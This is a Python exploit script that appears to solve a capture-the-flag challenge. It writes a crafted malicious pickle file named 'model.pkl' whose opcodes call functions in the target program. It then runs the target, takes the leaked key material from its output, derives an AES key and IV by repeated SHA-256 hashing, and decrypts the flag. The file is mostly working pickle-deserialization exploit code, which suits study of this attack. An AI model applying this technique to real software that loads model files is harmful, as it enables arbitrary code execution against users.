import base64
import hashlib
import os
import re
import subprocess
import sys

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad


BASE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

SRC = os.path.join(BASE, "src")
DIST = os.path.join(BASE, "dist")

TARGET = os.path.join(SRC, "Divergence.py")
MODEL = os.path.join(DIST, "model.pkl")


def build_payload():
    return (
        b"c__main__\n"
        b"arm\n"
        b")R"
        b"c__main__\n"
        b"reveal_material\n"
        b")R."
    )


def stage_one(seed):
    return hashlib.sha256(
        seed + bytes.fromhex("91274413")
    ).digest()


def stage_two(first):
    return hashlib.sha256(
        first + bytes.fromhex("6319A702")
    ).digest()


def stage_three(first, second):
    return hashlib.sha256(
        second[5:27]
        + first[11:29]
        + bytes.fromhex("D1A7")
    ).digest()


def derive_key(seed):
    first = stage_one(seed)
    second = stage_two(first)
    third = stage_three(first, second)

    material = (
        third[3:29]
        + second[7:23]
        + first[13:19]
    )

    return hashlib.sha256(material).digest()


def derive_iv(seed):
    first = stage_one(seed)
    second = stage_two(first)
    third = stage_three(first, second)

    material = (
        first[4:16]
        + third[18:26]
        + second[0:4]
    )

    return hashlib.sha256(material).digest()[:16]


def main():
    # Create malicious model
    with open(MODEL, "wb") as f:
        f.write(build_payload())

    # Run src/Divergence.py
    result = subprocess.run(
        [sys.executable, TARGET],
        cwd=DIST,
        capture_output=True
    )

    output = result.stdout.decode(errors="ignore")

    material = re.search(
        r"DIVERGENCE_MATERIAL=([A-Za-z0-9+/=]+)",
        output
    )

    ciphertext = re.search(
        r"ciphertext\s*=\s*([A-Za-z0-9+/=]+)",
        output
    )

    if not material or not ciphertext:
        raise RuntimeError("Exploit failed")

    seed = base64.b64decode(
        material.group(1)
    )

    encrypted = base64.b64decode(
        ciphertext.group(1)
    )

    key = derive_key(seed)
    iv = derive_iv(seed)

    cipher = AES.new(
        key,
        AES.MODE_CBC,
        iv
    )

    flag = unpad(
        cipher.decrypt(encrypted),
        AES.block_size
    )

    print(flag.decode())


if __name__ == "__main__":
    main()